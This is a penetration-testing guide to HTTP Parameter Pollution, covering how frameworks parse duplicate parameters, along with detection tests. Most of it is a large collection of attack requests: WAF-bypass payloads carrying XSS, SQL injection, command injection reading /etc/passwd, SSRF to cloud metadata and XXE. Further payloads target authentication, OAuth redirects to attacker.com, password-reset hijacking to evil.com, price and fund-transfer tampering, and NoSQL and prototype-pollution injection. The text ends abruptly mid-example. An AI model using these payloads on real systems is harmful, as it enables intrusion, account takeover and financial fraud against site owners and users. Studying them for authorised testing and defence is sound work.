---
title: HTTP Parameter Pollution
description: Complete guide to HTTP Parameter Pollution (HPP) — server-side and client-side techniques, parameter precedence exploitation, WAF bypass, authentication bypass, business logic abuse, payloads, privilege escalation, and defense for penetration testers and security researchers.
navigation:
  icon: i-lucide-copy-plus
  title: HTTP Parameter Pollution
---

## What is HTTP Parameter Pollution?

HTTP Parameter Pollution (HPP) is a web application vulnerability that occurs when an attacker **submits multiple HTTP parameters with the same name** in a single request. Different web servers, application frameworks, and proxies handle duplicate parameters differently — some take the **first** occurrence, some take the **last**, some **concatenate** all values, and some return them as an **array**. This inconsistency creates exploitable gaps between how security controls parse parameters and how the application processes them.

::callout{icon="i-lucide-info" color="blue"}
HPP is not about injecting malicious characters — it's about **exploiting the ambiguity** in how technology stacks handle duplicate parameter names. This makes HPP uniquely effective at bypassing WAFs, input validation, and security filters that only inspect one instance of a parameter.
::

### The Core Problem

When a request contains duplicate parameters like:

```http
GET /search?category=electronics&category=<script>alert(1)</script> HTTP/1.1
```

The critical question is: **which value does the application use?**

::tabs
  :::tabs-item{icon="i-lucide-eye" label="Server Behavior Differences"}

  | Technology | Behavior | Result for `?a=1&a=2` |
  |-----------|----------|----------------------|
  | **PHP/Apache** | Takes **last** occurrence | `a = 2` |
  | **ASP.NET/IIS** | **Concatenates** with comma | `a = 1,2` |
  | **JSP/Tomcat** | Takes **first** occurrence | `a = 1` |
  | **Python Flask** | Takes **first** occurrence | `a = 1` |
  | **Python Django** | Takes **last** occurrence | `a = 2` |
  | **Node.js Express** | Returns **array** | `a = [1, 2]` |
  | **Ruby on Rails** | Takes **last** occurrence | `a = 2` |
  | **Perl CGI** | Takes **first** occurrence | `a = 1` |
  | **Go net/http** | Returns **first** (via `.Get()`) | `a = 1` |
  | **Go net/http** | Returns **all** (via map) | `a = [1, 2]` |
  | **Nginx** | Takes **first** occurrence | `a = 1` |
  | **Spring MVC (Java)** | Takes **first** occurrence | `a = 1` |
  | **Google App Engine** | Takes **first** occurrence | `a = 1` |
  | **IBM Lotus Domino** | Takes **last** occurrence | `a = 2` |
  | **IBM HTTP Server** | Takes **first** occurrence | `a = 1` |
  | **mod_wsgi (Apache)** | Takes **first** occurrence | `a = 1` |
  | **Werkzeug** | Takes **first** (via `.get()`) | `a = 1` |
  | **FastAPI (Python)** | Returns **list** | `a = [1, 2]` |
  | **Koa.js** | Takes **last** occurrence | `a = 2` |

  :::

  :::tabs-item{icon="i-lucide-code" label="Why This Matters"}
  Consider a **WAF** (front-end) running on **Nginx** and an **application** running on **PHP/Apache**:

  ```http
  GET /transfer?amount=100&amount=999999 HTTP/1.1
  ```

  - **Nginx WAF** inspects the **first** parameter: `amount=100` → Looks legitimate ✅
  - **PHP Application** processes the **last** parameter: `amount=999999` → Unauthorized transfer 💀

  The WAF and application disagree on which value to use. The attacker exploits this disagreement.
  :::

  :::tabs-item{icon="i-lucide-code" label="Code Demonstration"}
  ```php [PHP — Last Parameter Wins]
  <?php
  // Request: ?name=john&name=admin
  echo $_GET['name']; // Output: "admin" (last value)
  ?>
  ```

  ```python [Flask — First Parameter Wins]
  from flask import request
  
  @app.route('/search')
  def search():
      # Request: ?name=john&name=admin
      name = request.args.get('name')  # Returns: "john" (first value)
      return f"Hello {name}"
  ```

  ```javascript [Express.js — Array]
  // Request: ?name=john&name=admin
  app.get('/search', (req, res) => {
    console.log(req.query.name); // Returns: ["john", "admin"] (array)
  });
  ```

  ```java [JSP — First Parameter Wins]
  // Request: ?name=john&name=admin
  String name = request.getParameter("name"); // Returns: "john" (first value)
  ```

  ```csharp [ASP.NET — Concatenation]
  // Request: ?name=john&name=admin
  string name = Request.QueryString["name"]; // Returns: "john,admin" (comma-separated)
  ```
  :::
::

---

## HPP Attack Categories

::card-group
  ::card
  ---
  title: Server-Side HPP (SHPP)
  icon: i-lucide-server
  ---
  Duplicate parameters exploit **back-end processing logic**. The attacker manipulates how the server interprets parameters to bypass validation, alter business logic, or access unauthorized resources.
  ::

  ::card
  ---
  title: Client-Side HPP (CHPP)
  icon: i-lucide-monitor
  ---
  Duplicate parameters are injected into URLs or forms that the **client's browser** processes. The browser may use a different parameter value than the server validated, enabling XSS, phishing, or link manipulation.
  ::

  ::card
  ---
  title: WAF/Filter Bypass
  icon: i-lucide-shield-off
  ---
  Split malicious payloads across duplicate parameters. The WAF inspects each parameter individually (seeing harmless fragments) while the application **concatenates** them into a complete attack payload.
  ::

  ::card
  ---
  title: Business Logic Abuse
  icon: i-lucide-briefcase
  ---
  Exploit parameter handling in financial transactions, access control decisions, voting systems, and e-commerce to **manipulate prices, quantities, permissions, or workflow states**.
  ::

  ::card
  ---
  title: Authentication/Authorization Bypass
  icon: i-lucide-lock-open
  ---
  Override authentication parameters, inject additional user IDs, manipulate role assignments, or bypass CSRF token validation through parameter pollution.
  ::

  ::card
  ---
  title: API Parameter Pollution
  icon: i-lucide-webhook
  ---
  Exploit REST APIs, GraphQL endpoints, and microservices that pass parameters between services with different parsing behaviors.
  ::
::

---

## How HPP Works — Detailed Mechanics

### Server-Side HPP (SHPP)

Server-Side HPP targets the **back-end** processing. The attacker submits duplicate parameters to exploit differences between security controls and application logic.

::steps{level="4"}

#### Identify Parameter Processing

Determine how the target application handles duplicate parameters. Submit:

```http
GET /test?param=value1&param=value2 HTTP/1.1
```

Observe which value is reflected or processed.

#### Identify Security Control Layer

Determine if a WAF, reverse proxy, or middleware sits between the client and application. Each layer may parse parameters differently.

#### Craft Pollution Payload

Submit duplicate parameters where:
- The **first** value satisfies the security control
- The **last** (or concatenated) value contains the attack payload

```http
GET /search?q=safe&q=<script>alert(1)</script> HTTP/1.1
```

#### Application Processes Attacker's Value

If the WAF checks the first value but the application uses the last, the malicious payload bypasses the WAF and reaches the application.

::

### Client-Side HPP (CHPP)

Client-Side HPP targets how the **browser or client-side JavaScript** processes URL parameters. The server may generate a URL with user-controlled content that, when additional parameters are injected, alters the page behavior.

::steps{level="4"}

#### Server Generates URL with User Input

The application builds a URL using a parameter value:

```php
<?php
$callback = $_GET['callback'];
// Generates: <a href="/action?callback=USER_INPUT&token=SECRET">
echo '<a href="/action?callback=' . $callback . '&token=' . $token . '">';
?>
```

#### Attacker Injects Additional Parameters

The attacker sets `callback` to a value that includes an `&` and additional parameters:

```text
callback=innocent%26token%3Dattacker_token%26action%3Ddelete
```

#### Resulting URL Contains Injected Parameters

```html
<a href="/action?callback=innocent&token=attacker_token&action=delete&token=REAL_TOKEN">
```

The browser now sees `token=attacker_token` **before** the real token. Depending on server-side parsing, the attacker's token may be used.

#### Browser Processes Modified URL

When the user clicks the link, the polluted parameters are sent to the server, potentially overriding legitimate values.

::

---

## Detection & Identification

::card-group
  ::card
  ---
  title: Parameter Precedence Testing
  icon: i-lucide-list-ordered
  ---
  Submit `?test=FIRST&test=LAST` and observe which value the application reflects, processes, or acts upon. This reveals the parsing behavior.
  ::

  ::card
  ---
  title: Technology Stack Identification
  icon: i-lucide-layers
  ---
  Identify the web server, framework, and middleware from response headers (`Server`, `X-Powered-By`, `X-AspNet-Version`). Cross-reference with the parameter precedence table.
  ::

  ::card
  ---
  title: URL Construction Analysis
  icon: i-lucide-link
  ---
  Find places where the application constructs URLs using user input. Check forms, redirects, API calls, OAuth flows, and payment processing URLs.
  ::

  ::card
  ---
  title: Proxy Chain Analysis
  icon: i-lucide-route
  ---
  Identify all intermediaries (WAF, CDN, reverse proxy, load balancer, API gateway) and determine how each parses parameters. Disagreements between layers create HPP opportunities.
  ::

  ::card
  ---
  title: Multi-Layer Response Comparison
  icon: i-lucide-diff
  ---
  Compare application responses when sending parameters via different methods: URL query string, POST body, both simultaneously, JSON body, and multipart form data.
  ::

  ::card
  ---
  title: Framework-Specific Quirks
  icon: i-lucide-wrench
  ---
  Test framework-specific parameter parsing behaviors. Some frameworks merge GET and POST parameters with different precedence rules. Others treat array syntax `param[]` differently.
  ::
::

### Detection Payloads

::code-group
```http [Basic Precedence Test — GET]
GET /page?param=FIRST&param=LAST HTTP/1.1
Host: target.com
```

```http [Basic Precedence Test — POST]
POST /page HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

param=FIRST&param=LAST
```

```http [Mixed GET + POST]
POST /page?param=GET_VALUE HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

param=POST_VALUE
```

```http [Array Syntax Test]
GET /page?param[]=FIRST&param[]=SECOND HTTP/1.1
Host: target.com
```

```http [Bracket Syntax Test]
GET /page?param[0]=FIRST&param[1]=SECOND HTTP/1.1
Host: target.com
```

```http [Dot Notation Test]
GET /page?param.first=A&param.second=B HTTP/1.1
Host: target.com
```

```http [JSON Body Test]
POST /api/action HTTP/1.1
Host: target.com
Content-Type: application/json

{"param": "value1", "param": "value2"}
```

```http [Mixed Content-Types]
POST /page?param=URL_VALUE HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

param=BODY_VALUE
```
::

::tip
The most critical test is **Mixed GET + POST**. Many frameworks have different precedence rules for query string vs body parameters. PHP uses `$_REQUEST` which merges both with configurable priority (`request_order` in php.ini). Django's `request.POST` ignores GET parameters, but `request.GET` ignores POST. Express merges them based on middleware configuration.
::

---

## GET vs POST Parameter Precedence

When parameters are sent via **both** GET (query string) and POST (body) simultaneously, different frameworks prioritize them differently.

| Technology | `$_GET['p']` | `$_POST['p']` | `$_REQUEST['p']` |
|-----------|-------------|---------------|-----------------|
| **PHP (default)** | URL value | Body value | Body value (POST wins in `$_REQUEST`) |
| **PHP (GPC order)** | URL value | Body value | Depends on `request_order` config |
| **ASP.NET** | URL value | Body value | Body value (POST wins by default) |
| **JSP/Servlet** | URL value via `getParameter()` returns **first** across both | - | - |
| **Flask** | `request.args` | `request.form` | Separate access only |
| **Django** | `request.GET` | `request.POST` | Separate access only |
| **Express.js** | `req.query` | `req.body` | Separate by default |
| **Rails** | Merged into `params` — POST wins | - | - |
| **Spring MVC** | Merged — first occurrence wins | - | - |

::warning
When an application uses a **merged** parameter access method (like PHP's `$_REQUEST` or Rails' `params`), attackers can override POST body parameters by injecting them in the URL query string, or vice versa, depending on the precedence configuration.
::

---

## Payloads & Techniques

::note
All payloads are organized by attack objective. Each section includes the target scenario, the exploitation technique, and example requests.
::

### WAF / Security Filter Bypass

The most common use of HPP is **bypassing Web Application Firewalls** that only inspect one instance of a parameter.

::collapsible
---
label: "WAF Bypass — Parameter Splitting"
---

When the back-end **concatenates** duplicate parameters (like ASP.NET/IIS), split a malicious payload across multiple parameters so each individual parameter appears harmless.

```http [XSS Payload Split — ASP.NET/IIS Concatenation]
GET /search?q=<script&q=>alert(1)</script> HTTP/1.1
Host: target.com

# WAF sees: q="<script" and q=">alert(1)</script>" — neither looks complete
# ASP.NET concatenates: q="<script,>alert(1)</script>" — may execute
```

```http [XSS — Split Tag and Event]
GET /page?input=<img&input=src=x&input=onerror=alert(1)> HTTP/1.1
Host: target.com

# ASP.NET result: input="<img,src=x,onerror=alert(1)>"
```

```http [SQLi Payload Split — ASP.NET]
GET /users?id=1 UNION&id=SELECT&id=username,password&id=FROM&id=users HTTP/1.1
Host: target.com

# ASP.NET concatenates: id="1 UNION,SELECT,username,password,FROM,users"
# With proper spacing: becomes valid SQL after comma removal
```

```http [SQLi — OR Bypass]
GET /login?user=admin'&user=OR&user='1'='1 HTTP/1.1
Host: target.com

# Concatenated: user="admin',OR,'1'='1"
```

```http [SQLi — Comment Split]
GET /data?id=1'/*&id=*/OR/*&id=*/1=1--+ HTTP/1.1
Host: target.com
```

```http [Path Traversal Split]
GET /file?name=..&name=/..&name=/..&name=/etc&name=/passwd HTTP/1.1
Host: target.com
```

```http [Command Injection Split]
GET /ping?host=127.0.0.1&host=;id HTTP/1.1
Host: target.com
```

```http [SSRF Split]
GET /fetch?url=http://&url=169.254.169.254&url=/latest/meta-data/ HTTP/1.1
Host: target.com
```
::

::collapsible
---
label: "WAF Bypass — Parameter Override (Last Wins)"
---

When the back-end takes the **last** parameter (PHP, Django, Rails), submit a safe value first and the malicious value second.

```http [XSS — PHP Last Wins]
GET /search?q=safe_search_term&q=<script>alert(document.cookie)</script> HTTP/1.1
Host: target.com

# WAF inspects first: q="safe_search_term" — clean ✅
# PHP uses last: q="<script>alert(document.cookie)</script>" — XSS 💀
```

```http [SQLi — PHP Last Wins]
GET /product?id=1&id=1' OR 1=1-- - HTTP/1.1
Host: target.com

# WAF: id=1 — looks like normal integer ✅
# PHP: id="1' OR 1=1-- -" — SQL injection 💀
```

```http [Path Traversal — Last Wins]
GET /download?file=report.pdf&file=../../../etc/passwd HTTP/1.1
Host: target.com
```

```http [Command Injection — Last Wins]
GET /status?host=google.com&host=;cat /etc/passwd HTTP/1.1
Host: target.com
```

```http [SSTI — Last Wins]
GET /render?template=default&template={{7*7}} HTTP/1.1
Host: target.com
```

```http [Open Redirect — Last Wins]
GET /redirect?url=https://target.com&url=https://attacker.com HTTP/1.1
Host: target.com
```

```http [LDAP Injection — Last Wins]
GET /lookup?user=john&user=*)(uid=*))%00 HTTP/1.1
Host: target.com
```

```http [XXE via Parameter — Last Wins]
POST /parse?input=safe&input=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root> HTTP/1.1
Host: target.com
```
::

::collapsible
---
label: "WAF Bypass — Parameter Override (First Wins)"
---

When the back-end takes the **first** parameter (JSP, Flask, Nginx), submit the malicious value first and a clean value second.

```http [XSS — JSP/Tomcat First Wins]
GET /search?q=<script>alert(1)</script>&q=safe_value HTTP/1.1
Host: target.com

# If WAF checks LAST: q="safe_value" — clean ✅
# JSP uses FIRST: q="<script>alert(1)</script>" — XSS 💀
```

```http [SQLi — First Wins]
GET /user?id=1' UNION SELECT username,password FROM users--&id=1 HTTP/1.1
Host: target.com
```

```http [Path Traversal — First Wins]
GET /read?file=../../../../etc/shadow&file=readme.txt HTTP/1.1
Host: target.com
```

```http [SSRF — First Wins]
GET /proxy?url=http://169.254.169.254/latest/meta-data/&url=http://example.com HTTP/1.1
Host: target.com
```
::

::collapsible
---
label: "WAF Bypass — Mixed GET/POST Confusion"
---

```http [POST Body Overrides URL Query]
POST /transfer?amount=10 HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

amount=999999

# WAF checks URL: amount=10 — within limits ✅
# PHP $_POST: amount=999999 — unauthorized transfer 💀
```

```http [URL Query Overrides POST Body]
POST /api/update?role=user HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

role=admin

# If app uses $_REQUEST with GET priority: role=user
# If app uses $_REQUEST with POST priority: role=admin
```

```http [JSON + URL Query Conflict]
POST /api/action?admin=false HTTP/1.1
Host: target.com
Content-Type: application/json

{"admin": true}

# URL parameter says false
# JSON body says true
# Which does the application trust?
```

```http [Multipart + URL Conflict]
POST /upload?filename=safe.txt HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="filename"

../../etc/cron.d/backdoor
------boundary--
```

```http [Cookie + URL + POST Triple Conflict]
POST /profile?theme=light HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: theme=dark

theme=<script>alert(1)</script>
```
::

### Authentication Bypass

::collapsible
---
label: "Login & Authentication Bypass Payloads"
---

```http [Override Username — PHP Last Wins]
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=guest&password=guest_password&username=admin

# First username=guest may pass basic validation
# PHP takes last: username=admin
# If password check is bypassed or weak: admin access
```

```http [Override Password Field]
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrong_password&password=

# Some apps treat empty password as skip
# Or password="" may match a reset state
```

```http [Inject Additional UID]
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=guest&password=guest_pass&uid=1

# uid=1 might be admin's user ID
# If app uses uid parameter for session creation
```

```http [Multiple User IDs — Array Confusion]
GET /api/profile?user_id=attacker_id&user_id=victim_id HTTP/1.1
Host: target.com
Authorization: Bearer attacker_token

# App authorizes based on first user_id (attacker's)
# But fetches data for second user_id (victim's)
```

```http [CSRF Token Pollution]
POST /change-email HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

csrf_token=invalid&email=attacker@evil.com&csrf_token=valid_token

# Some CSRF implementations validate only one occurrence
# If it checks last and attacker knows the pattern
```

```http [OAuth Authorization Bypass]
GET /oauth/authorize?client_id=legitimate_app&redirect_uri=https://legitimate.com/callback&redirect_uri=https://attacker.com/steal HTTP/1.1
Host: target.com

# OAuth server validates first redirect_uri ✅
# But uses last redirect_uri for actual redirect 💀
# Authorization code sent to attacker
```

```http [OAuth Scope Escalation]
GET /oauth/authorize?client_id=app&scope=read&scope=read+write+admin HTTP/1.1
Host: target.com

# Request read scope first (passes validation)
# Override with admin scope
```

```http [JWT Parameter Pollution]
POST /api/auth HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": "user", "role": "user", "role": "admin"}

# JSON parsers typically use LAST duplicate key
# role becomes "admin"
```

```http [API Key Override]
GET /api/data?api_key=free_tier_key&api_key=premium_key HTTP/1.1
Host: target.com

# Free key passes rate limit check
# Premium key used for data access
```

```http [Two-Factor Bypass]
POST /verify-2fa HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

code=000000&code=&skip_2fa=true

# Attempt to bypass 2FA through parameter injection
```
::

### Authorization & Access Control Bypass

::collapsible
---
label: "IDOR & Privilege Escalation via HPP"
---

```http [IDOR — Access Another User's Profile]
GET /api/profile?user_id=123&user_id=456 HTTP/1.1
Host: target.com
Authorization: Bearer user123_token

# Authorization checked for user 123 (valid) ✅
# Data returned for user 456 (unauthorized) 💀
```

```http [Admin Action — Role Override]
POST /api/users/delete HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

user_id=self&role=user&user_id=victim&role=admin

# Delete action performed with admin role on victim's account
```

```http [Document Access — Override File ID]
GET /download?doc_id=public_doc_123&doc_id=confidential_doc_789 HTTP/1.1
Host: target.com
```

```http [Tenant Isolation Bypass]
GET /api/data?tenant_id=attacker_tenant&tenant_id=victim_tenant HTTP/1.1
Host: target.com
Authorization: Bearer attacker_token
```

```http [Organization Access Bypass]
POST /api/org/settings HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

org_id=attacker_org&setting=value&org_id=target_org
```

```http [Feature Flag Override]
GET /dashboard?feature=basic&feature=premium&feature=enterprise HTTP/1.1
Host: target.com
```

```http [API Endpoint Version Override]
GET /api/v1/users?version=v1&version=v2 HTTP/1.1
Host: target.com

# v2 API might have fewer access controls
```

```http [Admin Panel Access — isAdmin Override]
GET /admin/dashboard?isAdmin=false&isAdmin=true HTTP/1.1
Host: target.com
```
::

### Business Logic Abuse

::collapsible
---
label: "E-Commerce & Financial Exploitation"
---

```http [Price Manipulation — Override Price]
POST /cart/add HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

product_id=100&price=999.99&price=0.01

# Legitimate price passes validation
# Application uses overridden price for checkout
```

```http [Quantity Manipulation]
POST /cart/update HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

item_id=50&quantity=1&quantity=9999

# Order 1 item (passes stock check)
# Process 9999 items
```

```http [Discount Code Stacking]
POST /checkout HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

discount=SAVE10&discount=SAVE50&discount=SAVE100

# Application might apply last discount
# Or concatenate/stack discounts
```

```http [Currency Manipulation]
POST /payment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

amount=100&currency=USD&currency=VND

# Pay $100 but charged in Vietnamese Dong (much lower value)
```

```http [Shipping Address Override]
POST /order/confirm HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

shipping_address=legitimate_address&payment_verified=true&shipping_address=attacker_address

# Payment verified for legitimate address
# Goods shipped to attacker address
```

```http [Fund Transfer — Account Override]
POST /transfer HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

from_account=attacker&to_account=merchant&amount=10&to_account=attacker&amount=10000

# Transfer validated for small amount to merchant
# Executed for large amount back to attacker
```

```http [Subscription Plan Override]
POST /subscribe HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

plan=free&plan=enterprise

# Charged for free plan
# Granted enterprise features
```

```http [Gift Card Value Manipulation]
POST /giftcard/create HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

value=10&value=10000&payment_amount=10

# Pay $10 for a $10,000 gift card
```

```http [Auction Bid Manipulation]
POST /auction/bid HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

item_id=1000&bid_amount=100&bid_amount=1

# Bid appears as $100 to other users
# Charged only $1
```

```http [Refund Amount Override]
POST /refund HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

order_id=5000&refund_amount=10&refund_amount=999999
```

```http [Voting System Manipulation]
POST /vote HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

candidate=A&candidate=A&candidate=A&candidate=A&candidate=A

# Multiple votes counted for same candidate
```
::

::collapsible
---
label: "Workflow & State Manipulation"
---

```http [Skip Approval Step]
POST /request/submit HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

status=pending&status=approved

# Submitted as pending (passes validation)
# Stored as approved (skips review)
```

```http [Override Order Status]
POST /order/update HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

order_id=1000&status=processing&status=delivered

# Marks order as delivered without shipping
```

```http [Password Reset — Email Override]
POST /forgot-password HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com&email=attacker@evil.com

# Reset token generated for victim
# Email sent to attacker (or both)
```

```http [Account Verification Bypass]
POST /verify HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=unverified@target.com&verified=false&verified=true
```

```http [Rate Limit Bypass — Different User IDs]
POST /api/action HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

user_id=user1&action=claim_bonus&user_id=user2

# Rate limit tracked for user1
# Action performed for user2
```
::

### API-Specific HPP

::collapsible
---
label: "REST API Parameter Pollution"
---

```http [REST API — JSON Duplicate Keys]
POST /api/v1/users HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": "newuser",
  "role": "user",
  "role": "admin",
  "email": "user@target.com"
}

# Most JSON parsers use last duplicate key
# role becomes "admin"
```

```http [REST API — Nested JSON Pollution]
POST /api/v1/update HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "user": {
    "name": "John",
    "role": "viewer"
  },
  "user": {
    "name": "John",
    "role": "admin",
    "permissions": ["read", "write", "delete", "manage"]
  }
}
```

```http [REST API — Query + Body Conflict]
POST /api/v1/records?limit=10&offset=0&admin=false HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "limit": 99999,
  "offset": 0,
  "admin": true
}
```

```http [REST API — Array Injection]
GET /api/v1/users?id=1&id=2&id=3&id=4&id=5 HTTP/1.1
Host: target.com

# May return data for multiple users
# Bypass single-user access restriction
```

```http [REST API — Filter Bypass]
GET /api/v1/records?status=public&status=private&status=internal HTTP/1.1
Host: target.com

# Access records with different visibility levels
```

```http [REST API — Sort/Order Injection]
GET /api/v1/data?sort=name&sort=password HTTP/1.1
Host: target.com

# May leak password field in sorted response
```

```http [REST API — Field Selection Pollution]
GET /api/v1/users?fields=name,email&fields=name,email,password,secret_key HTTP/1.1
Host: target.com
```

```http [REST API — Pagination Bypass]
GET /api/v1/records?page=1&per_page=10&per_page=999999 HTTP/1.1
Host: target.com

# Dump all records by overriding pagination limit
```
::

::collapsible
---
label: "GraphQL Parameter Pollution"
---

```http [GraphQL — Duplicate Variables]
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "query": "query GetUser($id: ID!) { user(id: $id) { name email role } }",
  "variables": {"id": "attacker_id"},
  "variables": {"id": "victim_id"}
}

# Authorized for attacker_id
# Query executed for victim_id
```

```http [GraphQL — Duplicate Operation]
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "query": "query { user(id: \"1\") { name } }",
  "query": "query { user(id: \"1\") { name email password ssn } }"
}
```

```http [GraphQL — Inline Variable Override]
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "query": "mutation { updateUser(id: \"1\", role: \"user\", role: \"admin\") { id role } }"
}
```

```http [GraphQL — Batch Query Pollution]
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

[
  {"query": "{ user(id: \"1\") { name } }"},
  {"query": "{ allUsers { name email password } }"}
]

# First query authorized
# Second query piggybacks on auth context
```
::

::collapsible
---
label: "Microservice Parameter Forwarding"
---

When a front-end API gateway forwards requests to backend microservices, parameter pollution can exploit parsing differences between services.

```http [Gateway → Service Parameter Override]
POST /api/order HTTP/1.1
Host: api-gateway.target.com
Content-Type: application/x-www-form-urlencoded

product_id=100&price=50.00&internal_override=true&price=0.01

# Gateway validates price=50.00
# Backend service sees price=0.01 or internal_override=true
```

```http [Service Mesh — Header-Based Routing Override]
GET /api/data HTTP/1.1
Host: target.com
X-Service-Version: stable
X-Service-Version: canary-debug

# Routed to debug/canary version with less security
```

```http [API Gateway — Rate Limit Bypass]
GET /api/expensive-operation HTTP/1.1
Host: target.com
X-API-Key: free_tier_key
X-API-Key: unlimited_key

# Rate limited by first key
# Processed with second key's permissions
```

```http [Backend Service — Admin Flag Injection]
POST /internal/process HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "user": "regular_user",
  "data": "payload",
  "is_admin": false,
  "is_admin": true
}
```
::

### Social Media & Sharing Link Manipulation

::collapsible
---
label: "Social Engineering via HPP"
---

```text [Facebook Share Link Pollution]
https://www.facebook.com/sharer.php?u=https://legitimate.com&u=https://attacker.com/phishing
```

```text [Twitter Share Link Pollution]
https://twitter.com/intent/tweet?text=Check+this&url=https://legitimate.com&url=https://attacker.com
```

```text [LinkedIn Share Pollution]
https://www.linkedin.com/shareArticle?url=https://legitimate.com&url=https://attacker.com&title=Important+Update
```

```text [WhatsApp Share Pollution]
https://api.whatsapp.com/send?text=Visit+https://legitimate.com&text=Visit+https://attacker.com/malware
```

```text [Email Mailto Link Pollution]
mailto:support@target.com?subject=Help&subject=URGENT&body=Please+click+http://attacker.com&bcc=attacker@evil.com
```

```text [Calendar Link Pollution]
https://calendar.google.com/calendar/render?action=TEMPLATE&text=Meeting&location=Office&location=http://attacker.com/meeting&details=Important
```

```text [Payment Link Pollution]
https://pay.target.com/checkout?merchant=legitimate&amount=10&amount=0.01&merchant=attacker_account
```
::

### Framework-Specific Exploitation

::collapsible
---
label: "PHP-Specific HPP Techniques"
---

```php [PHP — $_REQUEST Priority Confusion]
<?php
// php.ini: request_order = "GP" (GET then POST)
// GET: ?role=user
// POST: role=admin

// $_GET['role'] = "user"
// $_POST['role'] = "admin"  
// $_REQUEST['role'] = "admin" (POST overwrites GET)

// If authorization checks $_GET but action uses $_REQUEST:
// Authorization: role=user ✅
// Action: role=admin 💀
?>
```

```http [PHP — Array Parameter Injection]
POST /update HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

user[name]=John&user[role]=viewer&user[role]=admin

# PHP creates: $_POST['user'] = ['name' => 'John', 'role' => 'admin']
# Last duplicate array key wins
```

```http [PHP — Bracket vs No-Bracket]
GET /search?tag=safe&tag[]=<script>alert(1)</script> HTTP/1.1
Host: target.com

# $_GET['tag'] = "safe" (string)
# $_GET['tag'] = ["<script>alert(1)</script>"] (array, overrides string)
# Different handling causes unexpected behavior
```

```http [PHP — Type Juggling via HPP]
POST /api/check HTTP/1.1
Content-Type: application/x-www-form-urlencoded

password=0&password[]=

# Comparing string with array or 0 causes loose comparison issues
```

```http [PHP — extract() Exploitation]
POST /process HTTP/1.1
Content-Type: application/x-www-form-urlencoded

data=value&is_admin=1&_SESSION[role]=admin

# If code uses extract($_POST), variables are overwritten
# $is_admin becomes 1
# $_SESSION['role'] becomes admin
```
::

::collapsible
---
label: "ASP.NET-Specific HPP Techniques"
---

```http [ASP.NET — Comma Concatenation XSS]
GET /search?q=<script&q=>alert(1)</script> HTTP/1.1
Host: target.com

# ASP.NET: q = "<script,>alert(1)</script>"
# Depending on rendering context, XSS may execute
```

```http [ASP.NET — SQL Injection via Concatenation]
GET /data?id=1&id=OR 1=1-- HTTP/1.1
Host: target.com

# ASP.NET: id = "1,OR 1=1--"
# Query: SELECT * FROM items WHERE id IN (1,OR 1=1--)
# Syntax depends on how the app builds the query
```

```http [ASP.NET — ViewState Pollution]
POST /page HTTP/1.1
Content-Type: application/x-www-form-urlencoded

__VIEWSTATE=legitimate_value&__VIEWSTATE=tampered_value
```

```http [ASP.NET — Model Binding Override]
POST /api/user/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

Name=John&Email=john@target.com&IsAdmin=false&IsAdmin=true

# Model binding may use last value
# IsAdmin becomes true
```

```http [ASP.NET — Web.config Debug Override]
GET /page?debug=false&debug=true HTTP/1.1
Host: target.com

# May enable debug mode with verbose errors
```
::

::collapsible
---
label: "Node.js/Express-Specific HPP Techniques"
---

```http [Express — Array Injection → Type Confusion]
GET /api/search?role=user&role=admin HTTP/1.1
Host: target.com

# Express: req.query.role = ["user", "admin"]
# If code does: if (role === "admin") — fails (comparing array to string)
# If code does: if (role.includes("admin")) — succeeds
# If code does: db.query({role: role}) — MongoDB query with $in operator
```

```http [Express — MongoDB NoSQL Injection via Array]
GET /api/users?username=admin&username[$ne]=null HTTP/1.1
Host: target.com

# Express parses as: username = ["admin", {"$ne": "null"}]
# If passed directly to MongoDB query: may match all users
```

```http [Express — Prototype Pollution Helper]
POST /api/config HTTP/1.1
Content-Type: application/json

{
  "__proto__": {"isAdmin": true},
  "setting": "value",
  "__proto__": {"role": "admin"}
}
